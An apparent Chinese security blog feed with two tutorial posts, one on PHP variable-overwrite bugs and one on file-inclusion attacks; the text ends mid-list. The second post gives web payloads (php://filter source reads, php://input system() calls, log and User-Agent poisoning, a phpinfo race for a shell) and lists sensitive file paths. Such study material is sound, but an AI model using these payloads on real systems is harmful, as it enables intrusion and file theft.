    <link href="https://hack-for.fun/posts/20200114/"/>
    <id>https://hack-for.fun/posts/20200114/</id>
    <published>2020-01-13T16:00:00.000Z</published>
    <updated>2020-02-12T02:44:59.020Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00  前言"></a>0x00  前言</h1><p>昨天发的文件包含漏洞和今天的变量覆盖漏洞其实都是属于PHP安全问题的范畴,当然关于<strong>PHP安全的问题</strong>还有很多,比如后面会总结的<strong>代码执行漏洞</strong>这些</p><a id="more"></a><p>这个漏洞感觉现在只会在CTF题目中出现,因为防御这个漏洞的方法比较简单</p><blockquote><p>本学习笔记,大量参考自网络上各位大佬总结好的,再加上自己的心得总结而成,用途仅用于安全技术学习.文末注明参考资料,侵删.</p></blockquote><h1 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01  基础知识"></a>0x01  基础知识</h1><p>既然是PHP安全问题,那么就肯定和php的一些函数有关,下面来看看学习这些函数</p><p><strong>全局变量</strong></p><p><img src="https://i.loli.net/2020/01/13/FIRkl1cOqWTUXKH.png" alt></p><p>最常用的就是$GLOBALS</p><p>作用是引用全局作用域中可用的全部变量</p><p>说明:  一个包含了全部变量的全局组合数组。变量的名字就是数组的键。  </p><p><strong>extract()</strong></p><p><a href="https://www.runoob.com/php/func-array-extract.html" target="_blank" rel="noopener">https://www.runoob.com/php/func-array-extract.html</a></p><p>定义: </p><p>extract() 函数从数组中将变量导入到当前的符号表。</p><p><strong>该函数使用数组键名作为变量名，使用数组键值作为变量值。</strong>针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p><p>该函数返回成功设置的变量数目。</p><p>语法: </p><pre><code>extract(*array,extract_rules,prefix*)</code></pre><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><em>array</em></td><td>必需。规定要使用的数组。</td></tr><tr><td><em>extract_rules</em></td><td>可选。extract() 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定。可能的值：  <strong>EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。</strong>     <strong>EXTR_SKIP - 如果有冲突，不覆盖已有的变量。</strong>     EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。     EXTR_PREFIX_ALL - 给所有变量名加上前缀 prefix。     EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 prefix。     EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。     EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。     EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。</td></tr><tr><td><em>prefix</em></td><td>可选。如果 extract_rules 参数的值是 EXTR_PREFIX_SAME、EXTR_PREFIX_ALL、 EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS，则 prefix 是必需的。      该参数规定了前缀。前缀和数组键名之间会自动加上一个下划线。</td></tr></tbody></table><p><strong>parse_str()</strong></p><p>官方解释为: 将字符串解析成<strong>多个</strong>变量,该函数没有返回值</p><p><img src="https://i.loli.net/2020/01/13/7f3qQS8PgvGAulF.png" alt></p><p>parse_str() 函数把查询字符串解析到变量中。</p><p><strong>注释：</strong>如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。</p><p><strong>注释：</strong>php.ini 文件中的 magic_quotes_gpc 设置影响该函数的输出。如果已启用，那么在 parse_str() 解析之前，变量会被 addslashes() 转换。</p><p><strong>import_request_variables()</strong></p><p><img src="https://i.loli.net/2020/01/13/JOeIi156skadBEP.png" alt></p><p>其中第二个参数是为导入的变量添加的前缀,如果没有指定,则将覆盖全局变量</p><p><strong>可变变量$$</strong></p><p><img src="https://i.loli.net/2020/01/13/WxKihSDQA6X9q5j.png" alt></p><h1 id="0x02-变量覆盖漏洞"><a href="#0x02-变量覆盖漏洞" class="headerlink" title="0x02 变量覆盖漏洞"></a>0x02 变量覆盖漏洞</h1><p>变量覆盖指的是可以用我们自定义的参数值替换程序原有的变量值，变量覆盖漏洞通常需要结合程序的其他功能来实现完整攻击。<br>变量覆盖漏洞大多由函数使用不当导致，经常引发变量覆盖的漏洞有：extract()函数和parse_str()<br>函数，<strong>import_request_variables()函数则是用在没有开启全局变量注册的时候，调用了这个函数则相当于开启了全局变量注册</strong>。另外部分应用利用$$的方式注册变量没验证已有变量导致覆盖。</p><p><code>register_globals</code>的意思是注册为全局变量,如果为on的时候,传递过来的值会被直接注册为全局变量直接使用</p><h2 id="全局变量覆盖"><a href="#全局变量覆盖" class="headerlink" title="全局变量覆盖"></a>全局变量覆盖</h2><p>代码示例1:  </p><pre class=" language-PHP"><code class="language-PHP"><?php  //?id=1echo "Register_globals: ".(int)ini_get("register_globals")."<br/>"; echo '$_GET["id"] :'.$_GET['id']."<br/>";echo '$id :'.$id;?></code></pre><p>当register_globals=Off的时候，下一个程序接收的时候应该用$_GET[‘id’]来接受传递过来的值；</p><p>当register_globals=On的时候，下一个程序可以直接使用$id来接受值,也可以用$_GET[‘id’]来接受传递过来的值。</p><p>tips：如果上面的代码中，已经对变量$id赋了初始值，比如$id=0，那么即使在URL中有/test.php?id=1，也不会将变量覆盖，id值为0</p><p><img src="https://i.loli.net/2020/01/13/cxpTSbh3BCqQEyW.png" alt></p><p>代码示例2: </p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token keyword">echo</span> <span class="token string">"Register_globals: "</span><span class="token punctuation">.</span><span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string">"register_globals"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string">'register_globals'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$v</span><span class="token punctuation">)</span> <span class="token function">unset</span><span class="token punctuation">(</span>$<span class="token punctuation">{</span><span class="token variable">$k</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">print</span> <span class="token variable">$a</span><span class="token punctuation">.</span><span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span>  <span class="token keyword">print</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token delimiter">?></span></code></pre><p>因为变量a未初始化,提交?a=123&amp;b=456只回显456</p><p>当提交?GLOBALS[a]=123&amp;b=456时  都有回显</p><p>GLOBALS[a]用于覆盖</p><blockquote><p> PHP » 4.2.0 版开始配置文件中 PHP 指令 register_globals 的默认值从 on 改为 off 了,自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。</p></blockquote><h2 id="extract-变量覆盖"><a href="#extract-变量覆盖" class="headerlink" title="extract()变量覆盖"></a>extract()变量覆盖</h2><p>代码示例: </p><pre class=" language-PHP"><code class="language-PHP"><?php    $auth = '0';    extract($_GET);if ($auth == 1) {    echo "private!";}else {    echo "pubilc";}?></code></pre><p><a href="http://127.0.0.1/CTF/blfg.php?auth=1" target="_blank" rel="noopener">http://127.0.0.1/CTF/blfg.php?auth=1</a> 即可绕过服务器端逻辑</p><h2 id="parse-str-变量覆盖"><a href="#parse-str-变量覆盖" class="headerlink" title="parse_str()变量覆盖"></a>parse_str()变量覆盖</h2><p>parse_str() 函数把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。</p><pre class=" language-PHP"><code class="language-PHP"><?phpparse_str("a=1");echo $a."<br/>";      //$a=1parse_str("b=1&c=2",$myArray);print_r($myArray);   //Array ( [c] => 1 [b] => 2 ) ?></code></pre><p>tips：</p><p>parse_str()类似的函数还有mb_parse_str()，用法基本一致。</p><h2 id="import-request-variables变量覆盖"><a href="#import-request-variables变量覆盖" class="headerlink" title="import_request_variables变量覆盖"></a>import_request_variables变量覆盖</h2><p>覆盖原理其实基础知识里面也写了</p><p>import_request_variables 函数可以在 register_global = off 时，把 GET/POST/Cookie 变量导入全局作用域中。</p><pre class=" language-PHP"><code class="language-PHP"><?phpimport_request_variables("g", "get_");echo $get_id;?>//提交：?id=111//结构：111</code></pre><h2 id="遍历初始化变量"><a href="#遍历初始化变量" class="headerlink" title="遍历初始化变量"></a>遍历初始化变量</h2><p>使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。</p><p>代码示例:  </p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>$<span class="token punctuation">{</span><span class="token variable">$key</span><span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h1 id="0x03-漏洞防御"><a href="#0x03-漏洞防御" class="headerlink" title="0x03  漏洞防御"></a>0x03  漏洞防御</h1><ol><li>确保register_globals=OFF</li><li>如果不能自定义php.ini,那么应该在代码中严格控制</li><li>熟悉造成变量覆盖的函数和方法,检查用户是否能控制变量的来源</li><li>养成初始化变量的好习惯</li></ol><h1 id="0x04-漏洞挖掘"><a href="#0x04-漏洞挖掘" class="headerlink" title="0x04  漏洞挖掘"></a>0x04  漏洞挖掘</h1><p>由于变量覆盖漏洞通常要结合应用其他功能代码来实现完整攻击，所以挖掘一个可用的变量覆盖漏洞不仅仅要考虑的是能够实现变量覆盖，还要考虑后面的代码能不能让这个漏洞利用起来。<br>由函数导致的变量覆盖比较好挖掘，只要<strong>搜寻参数带有变量的extract()、parse_str()函数，然后去回溯变量是否可控。关于我们说过的使用双$符号注册变量会导致变量覆盖，我们可以通过搜“$$”这个关键字去挖掘。</strong></p><h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05  总结"></a>0x05  总结</h1><p>这个漏洞单独出现利用点很难(尤其是在黑盒情况),要看这个漏洞利用价值如何,还要看后面的代码能否被利用</p><p>白盒情况下,说不定运气好还可以挖出一些漏洞</p><h1 id="0x06-参考资料"><a href="#0x06-参考资料" class="headerlink" title="0x06  参考资料"></a>0x06  参考资料</h1><p><a href="https://www.freebuf.com/column/150731.html" target="_blank" rel="noopener">代码审计|变量覆盖漏洞</a></p><p><a href="https://www.cnblogs.com/xiaozi/p/7768580.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaozi/p/7768580.html</a></p><p><a href="https://www.jianshu.com/p/a4d782e91852" target="_blank" rel="noopener">https://www.jianshu.com/p/a4d782e91852</a></p><p><a href="https://blog.csdn.net/qq_36197704/article/details/81623825" target="_blank" rel="noopener">https://blog.csdn.net/qq_36197704/article/details/81623825</a></p><p>&lt;&lt;白帽子讲Web安全&gt;&gt;</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00  前言&quot;&gt;&lt;/a&gt;0x00  前言&lt;/h1&gt;&lt;p&gt;昨天发的文件包含漏洞和今天的变量覆盖漏洞其实都是属于PHP安全问题的范畴,当然关于&lt;strong&gt;PHP安全的问题&lt;/strong&gt;还有很多,比如后面会总结的&lt;strong&gt;代码执行漏洞&lt;/strong&gt;这些&lt;/p&gt;
    
    </summary>
    
    
      <category term="TOP10基础漏洞" scheme="https://hack-for.fun/categories/TOP10%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="变量覆盖" scheme="https://hack-for.fun/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"/>
    
      <category term="PHP安全问题" scheme="https://hack-for.fun/tags/PHP%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>一篇文章深入学习文件包含漏洞</title>
    <link href="https://hack-for.fun/posts/20200113/"/>
    <id>https://hack-for.fun/posts/20200113/</id>
    <published>2020-01-12T16:00:00.000Z</published>
    <updated>2020-01-25T16:34:02.102Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00  前言"></a>0x00  前言</h1><p>文件包含,就是用代码去包含(引用)其他文件(这个文件中有需要用到的代码),这样做的目的是节省开发者的时间,提高效率,与此同时也代带来了许多安全问题.以PHP为例,PHP的文件包含相关函数是无<strong>论参数的扩展名是什么,都会将内容当做PHP代码解析(PHP内核决定的)</strong> <a id="more"></a>                                                                                                                                               </p><h1 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01  基础知识"></a>0x01  基础知识</h1><ul><li>PHP伪协议</li><li>PHP相关函数</li><li>日志文件</li><li>PHP临时文件</li></ul><h2 id="PHP相关函数"><a href="#PHP相关函数" class="headerlink" title="PHP相关函数"></a>PHP相关函数</h2><p>php文件包含函数有四种: </p><pre class=" language-php"><code class="language-php"><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>其中,<code>include()</code>和<code>require()</code>的区别是: include包含过程中如果出现错误,会抛出一个警告,但是程序继续正常运行;require包含过程中如果出现了错误,同样会报错,但是会退出程序的运行</p><p><code>include_once()</code>和<code>require_once()</code>只包含一次,用于解决在同一个文件中,某个脚本执行时同一个文件会被包含超过一次的情况,如果包含的文件被包含过了,就不会再包含了</p><p>在PHP文档中有这样的说明</p><blockquote><p>被包含文件先按参数给出的路径寻找，如果没有给出目录（只有文件名）时则按照include_path 指定的目录寻找。如果在 include_path 下没找到该文件则 include 最后才在调用脚本文件所在的目录和当前工作目录下寻找。<br>当一个文件被包含时，语法解析器在目标文件的开头脱离 PHP 模式并进入 HTML 模式，到文件结尾处恢复。由于此原因，目标文件中需要作为 PHP 代码执行的任何代码都必须被包括在有效的 PHP 起始和结束标记之中。<br>如果“URL include wrappers”在 PHP 中被激活，可以用 URL（通过 HTTP 或者其它支持的封装协议——见支持的协议和封装协议）而不是本地文件来指定要被包含的文件。如果目标服务器将目标文件作为 PHP 代码解释，则可以用适用于 HTTP GET 的 URL 请求字符串来向被包括的文件传递变量。严格的说这和包含一个文件并继承父文件的变量空间并不是一回事；该脚本文件实际上已经在远程服务器上运行了，而本地脚本则包括了其结果。 </p></blockquote><p>在php.ini中有两个重要的参数</p><p>allow_url_include=on/off(<strong>默认为off,不允许包含url里的封装协议包含文件)</strong></p><p>allow_url_fopen=on/off(<strong>默认为on允许url里的封装协议访问文件</strong>)</p><p>要使用include的话必须开启fopen</p><p>双off</p><ol><li>普通本地文件包含正常</li><li>普通远程文件包含不正常</li><li>伪协议包含文件不正常</li></ol><p>allow_url_fopen=on , allow_url_include=off</p><ol><li>普通方式包含本地文件正常</li><li>普通远程文件包含不正常</li><li>伪协议包含文件正常</li></ol><p>双on</p><ol><li>普通本地文件包含正常</li><li>普通远程文件包含正常</li><li>伪协议包含文件正常</li></ol><p><code>readfile()</code>这个函数 对于allow_url_include=on/off没有影响的,allow_url_fopen=on可以让这个函数进行文件包含</p><p>同样的还有 <code>file_get_contents()</code> <code>fopen()</code></p><hr><p>JSP Servlet :  <code>ava.io.File()</code> <code>java.io.FileReader()</code> 等</p><p>ASP:  includefile includevirtual等</p><h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。</p><p>这个协议还可以用来任意文件读取<code>&lt;?php system(&#39;ls&#39;); ?&gt;</code> <code>&lt;?php system(cat /flag)?&gt;</code></p><p>或者写入一句话木马</p><p>需要开启<strong>allow_url_include=on</strong>,php版本小于5.3.0就可以造成任意代码执行</p><p>注：当<em>enctype=”multipart/form-data”</em>时，php://input是无效的。</p><p><img src="https://i.loli.net/2020/01/13/N49YRXA1i7v52xZ.png" alt="1.png"></p><p><img src="https://i.loli.net/2020/01/13/V71sc4UQl2duPhv.png" alt="2.png"></p><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>经常使用的伪协议，一般用于任意文件读取，有时也可以用于getshell.在双OFF的情况下也可以使用.</p><p>不需要allow_url_fopen和allow_url_include</p><p>php://filter是一种元封装器，用于数据流打开时筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用。类似readfile()、file()、file_get_contents(),在数据流读取之前没有机会使用其他过滤器。</p><p><img src="https://s2.ax1x.com/2019/11/04/Kx2CJx.md.png" alt></p><p><img src="http://tva1.sinaimg.cn/large/007X8olVly1g8l5ruo9tuj311a0ebta9.jpg" alt></p><p>最常用到的就是利用这个协议来读取源码,因为对源码编码后,可以防止文件内容被当做PHP解析</p><p>常见的读源码的payload</p><pre><code>?page=php://filter/read=convert.base64-encode/resource=index.php(读取经过base64编码的index.php)?page=php://filter/convert.base64-encode/resource=index.php(去掉read,可以绕过某些WAF)</code></pre><p><img src="https://i.loli.net/2020/01/13/NFP1fbODrACqaeG.png" alt></p><h3 id="php-output"><a href="#php-output" class="headerlink" title="php://output"></a>php://output</h3><p>对于allow_url_fopen和allow_url_include没有限制</p><blockquote><p>php://output 是一个只写的数据流，允许你以 print 和 echo 一样的方式写入到输出缓冲区。</p></blockquote><h3 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h3><p>file://伪协议在双OFF的时候也可以用，用于本地文件包含</p><p>注：file://协议必须是绝对路径</p><p><img src="http://tva1.sinaimg.cn/large/007X8olVly1g8l5rw25oqj310o0c074z.jpg" alt></p><h3 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h3><p>  使用这个协议必须要 <strong>php版本&gt;5.2.0</strong></p><p>使用这个协议必须 <code>allow_url_include=on</code></p><p>我在XSS中总结过这个协议了,这里直接复制过来好了,只是有一点点的区别而已(<strong>多加两个反斜杠//</strong>)</p><p>data:协议(Data URI Scheme)</p><p>data:协议仅IE浏览器不支持</p><p>data URI scheme 允许我们使用内联（inline-code）的方式在网页中包含数据，目的是将一些小的数据，直接嵌入到网页中，从而不用再从外部文件载入。常用于将图片嵌入网页。</p><p>Data URI Scheme支持的类型有</p><p> data:,&lt;文本数据&gt; </p><p>  data:text/plain,&lt;文本数据&gt; </p><p>  data:text/html,&lt;HTML代码&gt; </p><p>  data:text/html;base64,&lt;base64编码的HTML代码&gt; </p><p>  data:text/css,&lt;CSS代码&gt; </p><p>  data:text/css;base64,&lt;base64编码的CSS代码&gt; </p><p>  data:text/javascript,&lt;Javascript代码&gt; </p><p>  data:text/javascript;base64,&lt;base64编码的Javascript代码&gt; </p><p>  data:image/gif;base64,base64编码的gif图片数据 </p><p>  data:image/png;base64,base64编码的png图片数据 </p><p>  data:image/jpeg;base64,base64编码的jpeg图片数据 </p><p>  data:image/x-icon;base64,base64编码的icon图片数据</p><p><img src="/posts/20200113/E:%5Cimages%5C4%5C4.png" alt="4"></p><h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h3><p>利用条件: </p><ul><li>php版本&gt;5.3.0</li><li>php.ini中设置phar.readonly=off(默认为on,本地如果不设置的话就不能生成phar文件)</li></ul><p>简单来说就是php解压缩包的一个函数,解压的压缩包与后缀无关</p><p>PHP对phar的支持如下表</p><p><img src="http://tva1.sinaimg.cn/large/007X8olVly1g71kdrxr7ij310z0iwt9e.jpg" alt></p><p><strong>phar文件</strong></p><blockquote><p>一个php应用程序往往是由多个文件构成的，如果能把他们集中为一个文件来分发和运行是很方便的，这样的列子有很多，比如在window操作系统上面的安装程序、一个jquery库等等，为了做到这点php采用了phar文档文件格式，这个概念源自java的jar，但是在设计时主要针对 PHP 的 Web 环境，与 JAR 归档不同的是Phar 归档可由 PHP 本身处理，因此不需要使用额外的工具来创建或使用，使用php脚本就能创建或提取它。phar是一个合成词，由PHP 和 Archive构成，可以看出它是php归档文件的意思。</p><p>原文链接：<a href="https://blog.csdn.net/u011474028/article/details/54973571" target="_blank" rel="noopener">https://blog.csdn.net/u011474028/article/details/54973571</a></p></blockquote><p>可以把phar文件理解为文件的压缩包,用来做文件的归档</p><p>由四个部分组成: </p><ul><li><p>stub phar: 文件标识，格式为 xxx；</p></li><li><p>manifest: 也就是meta-data，压缩文件的属性等信息，以序列化存储；</p></li><li><p>contents: 压缩文件的内容；</p></li><li><p>signature: 签名，放在文件末尾；</p></li></ul><p>phar文件不仅仅可以可用来进行文件包含漏洞的利用,还可以用来进行phar反序列化利用</p><p>通过phar将一个写有恶意代码的普通文件压缩,然后通过这个协议进行解压执行含有恶意代码的普通文件</p><h3 id="zip-伪协议"><a href="#zip-伪协议" class="headerlink" title="zip://伪协议"></a>zip://伪协议</h3><p>用法：?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] </p><pre><code>zip://xxx.png#shell.php</code></pre><p>条件: </p><p>PHP版本大于5.3.0,在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以 #在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。</p><h3 id="expect"><a href="#expect" class="headerlink" title="expect://"></a>expect://</h3><p>需要服务器的PHP安装了EXpect扩展,使用expect://来执行命令</p><h2 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h2><ul><li>如果包含错误可能是open_base_dir()被限制</li><li>如果日志文件太大，包含可能会失败，所以选择合适的时间（如凌晨）</li><li>很多种日志文件我们都可以利用（apache,ssh,nginx）</li></ul><p>Linux常见的日志文件如下</p><ul><li>/var/log/apache/access.log </li><li>/var/log/apache/error.log </li><li>/var/log/nginx/access.log </li><li>/var/log/nginx/error.log</li><li>/var/log/vsftpd.log </li><li>/var/log/sshd.log </li><li>/var/log/auth.log </li><li>/var/log/mail </li><li>/var/log/httpd/error_log </li><li>/usr/local/apache/log/error_log</li><li>/usr/local/apache2/log/error_log</li></ul><p>access.log</p><p>文件是记录访问请求的日志文件,因此可以通过将一句话木马作为请求,然后这个一句话就会被写入到日志文件中</p><p>这里直接就拿实验室师傅的图片啦….我的服务器在公网上放问不了…</p><p><img src="http://tva1.sinaimg.cn/large/007X8olVly1g8l5rygfb6j30l602y0sr.jpg" alt></p><p>因为浏览器会对我们的一些字符自动进行url编码,所以要正确的把一句话写入到日志中,要使用<strong>curl</strong>或者<strong>抓包来修改请求</strong> </p><pre><code>curl -v &quot;http://www.targetweb.com/&lt;?php phpinfo();?&gt;&quot;</code></pre><p>然后利用文件包含漏洞来包含access.log就可以执行里面的一句话了</p><p>auth.log  </p><p>sshd.log是记录ssh连接的日志文件,里面有ssh连接的用户信息,所以可以使用一个一句话作为用户名来尝试ssh连接</p><p>ssh <code>&lt;?php phpinfo();?&gt;</code>@116.62.227.151’</p><p>然后就会看到代码被写入到了auth.log,然后利用文件包含就行了</p><p>/proc/self/environ</p><p>是Apache的环境变量文件,可通过<code>User-Agent</code>向其中写入内容,但是条件是php以cgi模式运行(以CGI的方式运行，CGI英文叫做公共网关接口，就是Apache在遇到PHP脚本的时候会将PHP程序提交给CGI应用程序（php-cgi.exe）解释，解释之后的结果返回给Apache，然后再返回给相应的请求用户。)</p><p><strong>CGI?</strong></p><blockquote><p>公共网关接口（Common Gateway Interface，CGI）是Web 服务器运行时外部程序的规范，按CGI 编写的程序可以扩展服务器功能。CGI 应用程序能与<a href="https://baike.baidu.com/item/浏览器/213911" target="_blank" rel="noopener">浏览器</a>进行交互，还可通过数据API与数据库服务器等外部数据源进行<a href="https://baike.baidu.com/item/通信/300982" target="_blank" rel="noopener">通信</a>，从数据库服务器中获取数据。格式化为HTML文档后，发送给浏览器，也可以将从浏览器获得的数据放到数据库中。几乎所有<a href="https://baike.baidu.com/item/服务器/100571" target="_blank" rel="noopener">服务器</a>都支持CGI，可用任何语言编写CGI，包括流行的C、C ++、Java、VB 和Delphi 等。CGI分为标准CGI和间接CGI两种。标准CGI使用<a href="https://baike.baidu.com/item/命令行/196110" target="_blank" rel="noopener">命令行</a>参数或环境变量表示服务器的详细请求，服务器与浏览器通信采用标准输入输出方式。间接CGI又称缓冲CGI，在CGI程序和CGI接口之间插入一个缓冲程序，缓冲程序与CGI接口间用标准输入输出进行通信</p></blockquote><p>修改User-Agent 为 <code>&lt;?php phpinfo();?&gt;</code></p><p>写入代码,再利用文件包含漏洞执行</p><p><strong>读配置文件找日志路径</strong></p><p>/etc/httpd/conf/httpd.conf<br>/etc/init.d/httpd</p><p><strong>Windows日志</strong></p><p>window 2003+iis6.0 日志文件默认放在<br>C:WINDOWSsystem32Logfiles<br>配置文件默认在<br>C:Windowssystem32inetsrvmetabase.xml</p><blockquote><p>iis 7日志文件默认在</p></blockquote><p>C:inetpublogsLogFiles<br> 配置文件默认目录<br>C:WindowsSystem32inetsrvconfigapplicationHost.config</p><blockquote><p>C:apachelogsaccess.log</p></blockquote><p>C:Program FilesApache GroupApachelogsaccess.log<br>C:program fileswampapache2logs<br>C:wamplogs<br>C:xamppapachelogserror.log</p><blockquote><p>C:apachelogserror.log</p></blockquote><p>C:Program FilesApache GroupApachelogserror.log<br>C:wampapache2logs<br>C:xamppapachelogsaccess.log</p><h2 id="PHP临时文件"><a href="#PHP临时文件" class="headerlink" title="PHP临时文件"></a>PHP临时文件</h2><p>php在上传文件时都会产生一个临时文件，将数据先写入临时文件，等完成文件上传后再删除临时文件（整个过程如下图所示</p><p><img src="http://tva1.sinaimg.cn/large/007X8olVly1g8l5rtmf4yj30oo0emgqi.jpg" alt></p><p>因为临时文件名是随机的，如果目标网站上存在phpinfo，则可以通过phpinfo来获取临时文件名，进而进行包含。</p><p><a href="https://github.com/vulhub/vulhub/tree/master/php/inclusion" target="_blank" rel="noopener">利用方法</a></p><p>在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件（通常是<code>/tmp/php[6个随机字符]</code>），文件名可以在<code>$_FILES</code>变量中找到。这个临时文件，在请求结束后就会被删除。</p><p>同时，因为phpinfo页面会将当前请求上下文中所有变量都打印出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到<code>$_FILES</code>变量的内容，自然也包含临时文件名。</p><p>在文件包含漏洞找不到可利用的文件时，即可利用这个方法，找到临时文件名，然后包含之。</p><p>但文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell。在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。</p><p>这个时候就需要用到条件竞争，具体流程如下：</p><ol><li>发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据</li><li>因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大</li><li>php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接</li><li>所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包</li><li>此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除</li><li>利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell</li></ol><p>有些东西还是有点难理解的</p><h1 id="0x02-什么是文件包含漏洞"><a href="#0x02-什么是文件包含漏洞" class="headerlink" title="0x02  什么是文件包含漏洞"></a>0x02  什么是文件包含漏洞</h1><p>利用条件: </p><ul><li>include函数通过动态变量的方式引入需要包含的文件</li><li>用户能控制该动态变量</li></ul><p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</p><p>这个恶意代码可以是一句话木马,导致getshell 也可以利用文件包含漏洞来任意文件读取,读取服务器上的一些敏感数据</p><p>举个最简单的代码实例</p><pre class=" language-PHP"><code class="language-PHP"><?php  $test = $_GET['a'];  include($test);?></code></pre><p>这里对获取到的参数没有进行任何过滤直接传入<code>include()</code>函数,攻击者可以修改参数的值来进行一些攻击</p><p>文件包含分两种,一个是本地文件包含还有就是远程文件包含</p><h2 id="本地文件包含-LFI"><a href="#本地文件包含-LFI" class="headerlink" title="本地文件包含(LFI)"></a>本地文件包含(LFI)</h2><p>本地文件包含漏洞,就是包含服务器本地的文件,实战中遇到的文件包含漏洞<strong>多数为本地文件包含漏洞</strong></p><h3 id="无限制本地文件包含"><a href="#无限制本地文件包含" class="headerlink" title="无限制本地文件包含"></a>无限制本地文件包含</h3><p>无限制的话,就可以直接用上面的一些基础知识和常见payload直接利用文件包含漏洞得到phpinfo啊,或者网站源码等</p><p><strong>常见的敏感信息路径：</strong></p><p>Windows系统</p><blockquote><p>c:\boot.ini // 查看系统版本</p><p>c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件</p><p>c:\windows\repair\sam // 